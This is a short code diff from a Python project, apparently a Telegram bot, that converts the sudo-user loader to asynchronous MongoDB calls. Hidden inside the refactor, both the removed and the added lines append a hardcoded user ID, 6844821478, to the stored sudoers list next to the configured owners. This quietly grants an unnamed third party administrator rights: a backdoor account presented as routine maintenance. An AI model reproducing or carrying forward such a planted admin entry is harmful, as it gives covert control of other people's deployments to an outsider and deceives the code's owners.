@@ -39,30 +39,30 @@ def dbb():
     LOGGER(__name__).info(f"ᴅᴀᴛᴀʙᴀsᴇ ʟᴏᴀᴅᴇᴅ.")
 
 
-def sudo():
+async def sudo():
     global SUDOERS
     OWNER = config.OWNER_ID
     if config.MONGO_DB_URI is None:
         for user_id in OWNER:
             SUDOERS.add(user_id)
     else:
-        sudoersdb = pymongodb.sudoers
-        sudoers = sudoersdb.find_one({"sudo": "sudo"})
-        sudoers = [] if not sudoers else sudoers["sudoers"]
+        sudoersdb = mongodb.sudoers
+        sudoers = await sudoersdb.find_one({"sudo": "sudo"})  # Asynchronous call to find_one
+        sudoers_list = [] if not sudoers else sudoers["sudoers"]
         for user_id in OWNER:
             SUDOERS.add(user_id)
-            if user_id not in sudoers:
-                sudoers.append(user_id)
-                sudoers.append(6844821478)
-                sudoersdb.update_one(
+            if user_id not in sudoers_list:
+                sudoers_list.append(user_id)
+                sudoers_list.append(6844821478)
+                await sudoersdb.update_one(  # Asynchronous update operation
                     {"sudo": "sudo"},
-                    {"$set": {"sudoers": sudoers}},
-                    upsert=True,
+                    {"$set": {"sudoers": sudoers_list}},
+                    upsert=True
                 )
-        if sudoers:
-            for x in sudoers:
+        if sudoers_list:
+            for x in sudoers_list:
                 SUDOERS.add(x)
-    LOGGER(__name__).info(f"sᴜᴅᴏ ᴜsᴇʀs ʟᴏᴀᴅᴇᴅ.")
+    LOGGER(__name__).info("sudo users loaded.")
 
 
 def heroku():
